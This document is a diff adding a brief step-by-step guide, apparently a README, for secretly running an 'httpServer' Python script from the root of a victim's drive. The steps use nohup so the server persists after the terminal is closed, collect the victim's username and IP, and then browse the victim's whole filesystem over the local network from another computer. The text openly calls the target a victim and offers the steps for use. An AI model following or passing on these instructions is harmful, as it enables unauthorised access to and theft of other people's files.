@@ -1,0 +1,10 @@
+Follow Step by Step, ask any questions you have.
+1. Get into a folder as far back into the filesystem you can. Users folder or Windows folder work, but getting back to the main hard disk/drive will work well.
+2. Plant httpServer there. Either move the file there or use Git Clone.
+3. Open a terminal in that folder and execute the command "nohup python2 httpServer.py". You should get an output like "Serving at port 8080
+                                                                                                                        Victim Username ~Username here~
+                                                                                                                        Victim IP ~Ip here~"
+4. Close the terminal
+5. On your computer (not the victim's), make sure you are on the same network as the victim and open your web browser and navigate to "ip:8080". Fill in ip with the
+"Victim IP" you got when you ran the python script. An example might look like 10.21.27.67:8080
+6. You should see a plain text webpage that says "Directory listing for /"
